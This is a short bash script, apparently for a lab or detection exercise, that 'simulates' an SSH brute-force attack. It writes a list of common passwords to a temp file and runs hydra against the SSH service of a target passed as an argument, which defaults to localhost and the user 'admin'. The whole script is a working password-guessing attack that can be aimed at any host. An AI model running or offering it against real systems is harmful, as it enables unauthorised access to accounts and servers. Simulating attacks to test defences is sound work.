#!/bin/bash
TARGET=${1:-127.0.0.1}
USER=${2:-admin}
echo "[*] Simulating SSH Brute Force against $TARGET..."
echo -e "password\n123456\nadmin\nroot\nqwerty" > /tmp/sim_passwords.txt
hydra -l $USER -P /tmp/sim_passwords.txt ssh://$TARGET
echo "[+] Hydra brute force finished."
